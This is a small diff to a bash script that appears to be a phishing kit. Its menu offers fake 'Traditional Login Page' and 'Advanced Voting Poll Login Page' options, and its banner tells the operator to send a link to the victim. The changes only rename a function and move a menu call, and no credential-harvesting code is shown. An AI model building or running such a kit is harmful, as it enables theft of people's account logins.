@@ -37,7 +37,7 @@ printf " \n"
 printf " \e[36;1m.:.Select your option and sent link with victim.:.\e[0m\n"
 printf " \n"
 }
-facebook(){
+menu() {
 printf " \n"
 printf " \e[1;31m[\e[0m\e[1;77m01\e[0m\e[1;31m]\e[0m\e[1;93m Traditional Login Page\e[0m\n"
 printf " \e[1;31m[\e[0m\e[1;77m02\e[0m\e[1;31m]\e[0m\e[1;93m Advanced Voting Poll Login Page\e[0m\n"
@@ -297,4 +297,3 @@ printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;93m Waiting for Next Log
 }
 banner
 deps
-menu
